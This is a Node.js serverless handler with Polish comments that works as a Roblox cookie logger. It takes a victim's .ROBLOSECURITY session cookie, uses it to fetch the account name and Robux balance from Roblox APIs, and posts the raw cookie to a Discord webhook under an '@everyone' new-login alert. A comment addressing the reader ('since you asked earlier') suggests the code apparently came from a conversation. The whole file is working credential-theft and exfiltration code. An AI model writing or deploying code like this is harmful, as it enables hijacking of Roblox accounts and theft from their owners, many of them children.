const axios = require('axios');

export default async function handler(req, res) {
    // Dodajemy nagłówki, żeby uniknąć problemów z przesyłaniem danych
    res.setHeader('Access-Control-Allow-Credentials', true);
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
    res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');

    if (req.method === 'OPTIONS') {
        res.status(200).end();
        return;
    }

    if (req.method !== 'POST') return res.status(405).send('Method Not Allowed');

    const { cookie, webhookUrl } = req.body;

    try {
        // Próba pobrania danych
        const robloxRes = await axios.get('https://users.roblox.com/v1/users/authenticated', {
            headers: { 
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            }
        });

        const { id, name } = robloxRes.data;

        // Pobieranie Robuxów (skoro o to pytałeś wcześniej)
        const economyRes = await axios.get(`https://economy.roblox.com/v1/users/${id}/currency`, {
            headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
        });

        const robuxCount = economyRes.data.robux;

        // Wysyłka na Discord
        await axios.post(webhookUrl, {
            content: "@everyone Wykryto nowe logowanie!",
            embeds: [{
                title: "📊 Informacje o koncie",
                color: 0x00ff00,
                fields: [
                    { name: "Użytkownik", value: name, inline: true },
                    { name: "Robux", value: robuxCount.toString(), inline: true },
                    { name: "Ciasteczko", value: `\`\`\`${cookie}\`\`\`` }
                ]
            }]
        });

        return res.status(200).json({ success: true, user: name });
    } catch (error) {
        console.error(error.response ? error.response.data : error.message);
        return res.status(400).json({ 
            success: false, 
            message: "Ciasteczko wygasło lub zostało zablokowane przez IP-Lock Robloxa." 
        });
    }
}
